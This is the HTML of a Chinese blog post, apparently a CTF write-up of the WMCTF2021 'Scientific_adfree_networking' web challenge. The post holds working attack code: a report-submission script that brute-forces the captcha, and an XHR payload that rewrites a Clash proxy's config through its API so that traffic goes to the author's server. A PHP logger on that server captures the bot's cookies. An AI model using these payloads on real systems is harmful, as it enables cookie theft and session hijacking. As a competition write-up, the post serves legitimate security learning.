@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>[WMCTF2021]Scientific_adfree_networking - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="[WMCTF2021]Scientific_adfree_networking" />
+<meta property="og:description" content="WMCTF2021失之交臂的一道题，蛮有意思的" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://clq0.top/scientific_adfree_networking/" />
+<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="article:published_time" content="2021-09-08T19:05:13+08:00" />
+<meta property="article:modified_time" content="2021-09-08T19:05:13+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+
+<meta name="twitter:title" content="[WMCTF2021]Scientific_adfree_networking"/>
+<meta name="twitter:description" content="WMCTF2021失之交臂的一道题，蛮有意思的"/>
+<meta name="application-name" content="Leon&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/scientific_adfree_networking/" /><link rel="prev" href="https://clq0.top/commons_collections_analysis/" /><link rel="next" href="https://clq0.top/shiro_550_analysis/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[WMCTF2021]Scientific_adfree_networking",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/clq0.top\/scientific_adfree_networking\/"
+        },"genre": "posts","keywords": "SSRF, XSS","wordcount":  1093 ,
+        "url": "https:\/\/clq0.top\/scientific_adfree_networking\/","datePublished": "2021-09-08T19:05:13+08:00","dateModified": "2021-09-08T19:05:13+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+                "@type": "Person",
+                "name": "Leon"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">[WMCTF2021]Scientific_adfree_networking</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-09-08">2021-09-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1093 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;3 minutes&nbsp;<span id="/scientific_adfree_networking/" class="leancloud_visitors" data-flag-title="[WMCTF2021]Scientific_adfree_networking">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scientific_adfree_networking">scientific_adfree_networking</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>WMCTF2021失之交臂的一道题，蛮有意思的</p>
+<h2 id="scientific_adfree_networking">scientific_adfree_networking</h2>
+<p>打开一个blog，有一条需要登录才可见的<code>Note to self(secret!)</code>
+然后看了一下其他信息，简单来说就是tom使用了clash进行屏蔽广告，<code>/static/files/clash.conf</code>可以下载到他使用的配置文件，里面只有屏蔽规则，没有配置代理</p>
+<p>然后<code>report</code>路由可以给tom发信息，tom会去看（后面打了半天，客服才说每看完一个请求都会重启clash，然后才把多次请求写在一起）</p>
+<p>想了一下这里应该没法xsleak，看他专门描述开了clash，就想能不能控制修改clash的配置文件（看配置文件的时候看到有个external controller API是可控的），然后代理到vps看能不能拿tom的cookie</p>
+<p>然后找可控点的时候看到了<code>logout</code>路由可以进行跳转</p>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/NK8jWXZ.png" title="https://gitee.com/leonsec/images/raw/master/NK8jWXZ.png" data-thumbnail="https://gitee.com/leonsec/images/raw/master/NK8jWXZ.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/NK8jWXZ.png"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/NK8jWXZ.png, https://gitee.com/leonsec/images/raw/master/NK8jWXZ.png 1.5x, https://gitee.com/leonsec/images/raw/master/NK8jWXZ.png 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/NK8jWXZ.png" />
+    </a>
+<p>于是可以控制一下xhr，打external controller API进行修改，看了一下api文档：</p>
+<p><a href="https://clash.gitbook.io/doc/restful-api" target="_blank" rel="noopener noreffer">https://clash.gitbook.io/doc/restful-api</a></p>
+<p>除了<code>configs</code>路由的<code>PUT</code>可以控制path重新加载配置文件，没啥可用的</p>
+<p>然后就去撕源码，发现同一个路由下居然还有个<code>payload</code>参数可以控制，直接从传输的字节加载配置文件：</p>
+<p><a href="https://github.com/Dreamacro/clash/blob/47044ec0d81dc0dc92a2dafc834f2b658177dee8/hub/route/configs.go#L112" target="_blank" rel="noopener noreffer">https://github.com/Dreamacro/clash/blob/47044ec0d81dc0dc92a2dafc834f2b658177dee8/hub/route/configs.go#L112</a></p>
+<p>然后就直接修改配置文件使用http代理，代理到vps上，后来发现并没有什么卵用</p>
+<p>一开始直接nc监听，但是它会先用<code>CONNECT</code>请求判断是否连接成功，所以得伪造一个真代理随便代理到哪都行，然后vps还配置了host防止它请求失败:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">127.0.0.1 blog.tomswebsite.com
+</code></pre></td></tr></table>
+</div>
+</div><p>但是它第二次http请求打过来还是没有cookie。。</p>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/EnOYS2p.png" title="https://gitee.com/leonsec/images/raw/master/EnOYS2p.png" data-thumbnail="https://gitee.com/leonsec/images/raw/master/EnOYS2p.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/EnOYS2p.png"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/EnOYS2p.png, https://gitee.com/leonsec/images/raw/master/EnOYS2p.png 1.5x, https://gitee.com/leonsec/images/raw/master/EnOYS2p.png 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/EnOYS2p.png" />
+    </a>
+<p>然后又去看源码找了一下可控文件的地方，api给出的就只有<code>configs</code>的path那个可以控制绝对路径加载配置文件，加载其他文件可以报错泄漏4 5个字符</p>
+<p>还有配置文件中<code>proxy-providers</code>的配置，也是指定路径加载配置文件，详细配置：</p>
+<p><a href="https://github.com/Dreamacro/clash/wiki/configuration" target="_blank" rel="noopener noreffer">https://github.com/Dreamacro/clash/wiki/configuration</a></p>
+<p>请求脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+ 
+<span class="n">path</span> <span class="o">=</span> <span class="s2">&#34;logout?next=http://159.75.82.124:9001/1.html&#34;</span>
+<span class="n">body</span> <span class="o">=</span> <span class="s2">&#34;a&#34;</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="n">report_url</span><span class="o">=</span><span class="s2">&#34;http://eci-2zeawo463qlngdj4qxbv.cloudeci1.ichunqiu.com:8888/report&#34;</span>
+<span class="c1"># proxies = {&#34;http&#34; : &#34;http://127.0.0.1:8080&#34;}</span>
+
+<span class="n">index</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">report_url</span><span class="p">)</span>
+<span class="n">gettoken</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;(==)(.*?)(&lt;input)&#34;</span><span class="p">,</span><span class="n">index</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="n">token</span> <span class="o">=</span> <span class="n">gettoken</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000001</span><span class="p">):</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">((</span><span class="s1">&#39;WMCTF_&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="n">token</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;WMCTF_&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+        <span class="k">break</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;title&#34;</span><span class="p">:</span> <span class="n">path</span><span class="p">,</span>
+        <span class="s2">&#34;body&#34;</span><span class="p">:</span> <span class="n">body</span><span class="p">,</span>
+        <span class="s2">&#34;captcha&#34;</span><span class="p">:</span> <span class="s1">&#39;WMCTF_&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">index</span><span class="o">.</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="n">gettoken</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;(class=</span><span class="se">\&#34;</span><span class="s2">flash</span><span class="se">\&#34;</span><span class="s2">&gt;)(.*?)(&lt;/div&gt;)&#34;</span><span class="p">,</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">gettoken</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>xhr:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">var</span> <span class="nx">xhr1</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">xhr2</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">xhr3</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">xhr4</span><span class="p">;</span>
+<span class="nx">xhr1</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">xhr1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;PUT&#34;</span><span class="p">,</span><span class="s2">&#34;http://127.0.0.1:9090/configs&#34;</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+<span class="nx">xhr1</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span><span class="s1">&#39;application/json&#39;</span><span class="p">)</span>
+<span class="nx">xhr1</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="sb">`{&#34;payload&#34;:&#34;mixed-port: 1080\\nallow-lan: false\\nmode: Rule\\nlog-level: silent\\nexternal-controller: &#39;127.0.0.1:9090&#39;\\nproxies:\\n  - name: \\&#34;test\\&#34;\\n    type: http\\n    server: 159.75.82.124\\n    port: 19000\\nproxy-groups:\\n  - name: \\&#34;group1\\&#34;\\n    type: select\\n    proxies:\\n      - test\\nrules:\\n  - DOMAIN-SUFFIX,blog.tomswebsite.com,group1\\n  - IP-CIDR,127.0.0.0/8,group1&#34;}`</span><span class="p">);</span>
+<span class="nx">xhr2</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">xhr2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span><span class="s2">&#34;http://blog.tomswebsite.com:8888/report&#34;</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+<span class="nx">xhr2</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="c1">// xhr3=new XMLHttpRequest();
+</span><span class="c1">// xhr3.open(&#34;GET&#34;,&#34;http://127.0.0.1:9090/configs&#34;,false);
+</span><span class="c1">// xhr3.send();
+</span><span class="c1">// xhr4=new XMLHttpRequest();
+</span><span class="c1">// xhr4.open(&#34;GET&#34;,&#34;http://159.75.82.124:9001/&#34;+xhr3.responseText,false);
+</span><span class="c1">// xhr4.send();
+</span><span class="c1"></span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
+<span class="kd">function</span> <span class="nx">em_getallheaders</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nx">$headers</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="nx">foreach</span> <span class="p">(</span><span class="nx">$_SERVER</span> <span class="nx">as</span> <span class="nx">$name</span> <span class="p">=&gt;</span> <span class="nx">$value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">$name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;HTTP_&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">$headers</span><span class="p">[</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="nx">ucwords</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">$name</span><span class="p">,</span> <span class="mi">5</span><span class="p">)))))]</span> <span class="o">=</span> <span class="nx">$value</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">$headers</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nx">$headers</span> <span class="o">=</span> <span class="nx">em_getallheaders</span><span class="p">();</span>
+<span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;headers.txt&#34;</span><span class="p">,</span> <span class="nx">var_export</span><span class="p">(</span><span class="nx">$headers</span><span class="p">,</span><span class="kc">true</span><span class="p">).</span><span class="s2">&#34;\n&#34;</span><span class="p">,</span> <span class="nx">FILE_APPEND</span> <span class="o">|</span> <span class="nx">LOCK_EX</span><span class="p">);</span>
+<span class="o">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>以上是比赛时的做题记录，当时光顾着看代理服务接收请求的cookie了，没注意代理后的流量emmm，还觉得后续可能没那么简单，肝了一下午后没有再看这道题了</p>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/ceeb653ely1gm1l440lqpj20ku0kl41y-20210908185648546.jpg" title="https://gitee.com/leonsec/images/raw/master/ceeb653ely1gm1l440lqpj20ku0kl41y-20210908185648546.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/ceeb653ely1gm1l440lqpj20ku0kl41y-20210908185648546.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/ceeb653ely1gm1l440lqpj20ku0kl41y-20210908185648546.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/ceeb653ely1gm1l440lqpj20ku0kl41y-20210908185648546.jpg, https://gitee.com/leonsec/images/raw/master/ceeb653ely1gm1l440lqpj20ku0kl41y-20210908185648546.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/ceeb653ely1gm1l440lqpj20ku0kl41y-20210908185648546.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/ceeb653ely1gm1l440lqpj20ku0kl41y-20210908185648546.jpg" />
+    </a>
+<p>实际上代理转发后的流量是带了cookie的，获取到cookie然后解码登录admin拿到flag</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-09-08</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/scientific_adfree_networking/" data-title="[WMCTF2021]Scientific_adfree_networking" data-hashtags="SSRF,XSS"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/scientific_adfree_networking/" data-hashtag="SSRF"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/scientific_adfree_networking/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/scientific_adfree_networking/" data-title="[WMCTF2021]Scientific_adfree_networking"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ssrf/">SSRF</a>,&nbsp;<a href="/tags/xss/">XSS</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/commons_collections_analysis/" class="prev" rel="prev" title="Apache Commons Collections反序列化链分析"><i class="fas fa-angle-left fa-fw"></i>Apache Commons Collections反序列化链分析</a>
+            <a href="/shiro_550_analysis/" class="next" rel="next" title="Shiro-550漏洞分析(CVE-2016-4437)">Shiro-550漏洞分析(CVE-2016-4437)<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1